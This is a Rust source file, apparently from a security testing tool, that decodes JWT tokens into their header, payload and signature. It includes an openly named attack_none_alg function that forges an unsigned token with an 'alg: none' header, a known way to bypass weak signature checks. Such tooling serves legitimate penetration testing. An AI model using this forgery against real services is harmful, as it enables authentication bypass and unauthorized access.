use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct JwtHeader {
    pub alg: String,
    pub typ: Option<String>,
}

#[derive(Debug, Clone, Default)]
pub struct JwtToken {
    #[allow(dead_code)]
    pub raw: String,
    pub header: String,
    pub payload: String,
    pub signature: String,
    pub header_parsed: Option<JwtHeader>,
    pub valid_structure: bool,
}

pub fn decode(token: &str) -> JwtToken {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return JwtToken {
            raw: token.to_string(),
            valid_structure: false,
            ..Default::default()
        };
    }

    let header_b64 = parts[0];
    let payload_b64 = parts[1];
    let signature_b64 = parts[2];

    let header_decoded = decode_b64_component(header_b64);
    let payload_decoded = decode_b64_component(payload_b64);
    
    let header_parsed: Option<JwtHeader> = serde_json::from_str(&header_decoded).ok();

    JwtToken {
        raw: token.to_string(),
        header: header_decoded,
        payload: payload_decoded,
        signature: signature_b64.to_string(),
        header_parsed,
        valid_structure: true,
    }
}

pub fn attack_none_alg(token: &str) -> String {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return "Invalid Token".to_string();
    }

    // 1. New Header {"alg": "none", "typ": "JWT"}
    let new_header = r#"{"alg":"none","typ":"JWT"}"#;
    let new_header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(new_header);

    // 2. Keep Payload (or modify if needed, for now keep original)
    let payload_b64 = parts[1];

    // 3. Constant signature (empty or dot?) 
    // Usually "header.payload." with no signature bytes
    format!("{}.{}.", new_header_b64, payload_b64)
}

fn decode_b64_component(input: &str) -> String {
    // Add padding if needed
    let mut padded = input.to_string();
    while padded.len() % 4 != 0 {
        padded.push('=');
    }
    
    // Try URL Safe, then Standard
    if let Ok(bytes) = general_purpose::URL_SAFE.decode(input) { // Check input directly first
         return String::from_utf8_lossy(&bytes).to_string();
    }
    
     if let Ok(bytes) = general_purpose::URL_SAFE_NO_PAD.decode(input) { 
         return String::from_utf8_lossy(&bytes).to_string();
    }
    
    if let Ok(bytes) = general_purpose::STANDARD.decode(&padded) {
        return String::from_utf8_lossy(&bytes).to_string();
    }

    "Error decoding Base64".to_string()
}
